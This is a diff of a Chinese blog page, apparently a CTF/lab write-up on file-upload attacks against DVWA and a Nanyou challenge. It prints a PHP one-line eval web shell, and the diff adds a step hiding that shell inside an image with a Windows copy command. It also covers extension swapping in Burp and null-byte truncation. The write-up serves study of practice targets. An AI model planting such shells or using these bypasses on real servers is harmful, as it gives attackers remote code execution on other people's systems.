@@ -94,13 +94,14 @@
 <meta property="og:image" content="https://i.imgur.com/IgRtFN9.png">
 <meta property="og:image" content="https://i.imgur.com/sltFDav.png">
 <meta property="og:image" content="https://i.imgur.com/r5KiC7d.png">
+<meta property="og:image" content="https://i.imgur.com/RAZTIJA.png">
 <meta property="og:image" content="https://i.imgur.com/9eNMGOj.png">
 <meta property="og:image" content="https://i.imgur.com/MMm4MnS.png">
 <meta property="og:image" content="https://i.imgur.com/fsyBb1V.png">
 <meta property="og:image" content="https://i.imgur.com/BllPY2U.png">
 <meta property="og:image" content="https://i.imgur.com/wyE4KRD.png">
 <meta property="og:image" content="https://i.imgur.com/5lSntcw.png">
-<meta property="og:updated_time" content="2018-11-04T08:31:07.309Z">
+<meta property="og:updated_time" content="2018-11-06T10:14:17.437Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="初窥文件上传">
 <meta name="twitter:description" content="头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧">
@@ -348,6 +349,7 @@
       
         <h2 id="头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧"><a href="#头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧" class="headerlink" title="头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧"></a>头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧</h2><a id="more"></a>
 <h2 id="1-基于DVWA的文件上传"><a href="#1-基于DVWA的文件上传" class="headerlink" title="1.基于DVWA的文件上传"></a>1.基于DVWA的文件上传</h2><p><strong>（1）LOW级别</strong><br><img src="https://i.imgur.com/B8aOm31.png" alt=""><br>low级别的文件上传什么都没有过滤掉，所以直接上传带有一句话木马的php文件就行<br>php一句话木马如下所示<br><code>&lt;?php @eval($_POST[yjh]);?&gt;</code><br>上传结果如下所示<br><img src="https://i.imgur.com/hk29VmV.png" alt=""><br>这时候就可以上菜刀连了<br><img src="https://i.imgur.com/BGafxbx.png" alt=""><br>这就算是一次简单的上传了<br><strong>（2）Medium级别</strong><br>这个级别再上传php文件就不行了<br><img src="https://i.imgur.com/IgRtFN9.png" alt=""><br>这时候就要靠抓包了，上传png文件然后抓包，把feilname的后缀改为php，再把burp给off掉就能上传上去了，之后就能上菜刀连了<br><img src="https://i.imgur.com/sltFDav.png" alt=""><br><img src="https://i.imgur.com/r5KiC7d.png" alt=""></p>
+<p><strong>（3）High级别</strong><br>这道题目需要上传的是自制的图片，其中附带有一句话木马<br>需要的原材料有：一张图片，写好的一句话木马，里面写上cmd的bat文件<br><img src="https://i.imgur.com/RAZTIJA.png" alt=""><br>然后打开cmd，敲命令<br><code>copy header.jpg/b+1.php header1.jpg</code><br>把制作好的header1上传上去就能上传成功，之后就能连菜刀了</p>
 <h2 id="2-南邮题目上传绕过（00截断）"><a href="#2-南邮题目上传绕过（00截断）" class="headerlink" title="2.南邮题目上传绕过（00截断）"></a>2.南邮题目上传绕过（00截断）</h2><p><img src="https://i.imgur.com/9eNMGOj.png" alt=""></p>
 <p><strong>传.jpg类型的文件，结果爆出了一条路径/uploads/</strong><br><img src="https://i.imgur.com/MMm4MnS.png" alt=""><br><strong>那我传.php的文件</strong><br><img src="https://i.imgur.com/fsyBb1V.png" alt=""><br><strong>就没有爆出路径</strong><br><strong>所以就抓包，而且是抓上传.jpg文件的包</strong><br><strong>原包</strong><br><img src="https://i.imgur.com/BllPY2U.png" alt=""><br><strong>修改过后的包，就是在原来爆出的路径后面加上1.php，注意1.php后面有空格方便找出hex为20的值并改为00（00截断）</strong><br><img src="https://i.imgur.com/wyE4KRD.png" alt=""><br>爆出flag<br><img src="https://i.imgur.com/5lSntcw.png" alt=""></p>
 <h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p><strong>上传绕过的方法很多，还有很长的路要走啊！</strong></p>
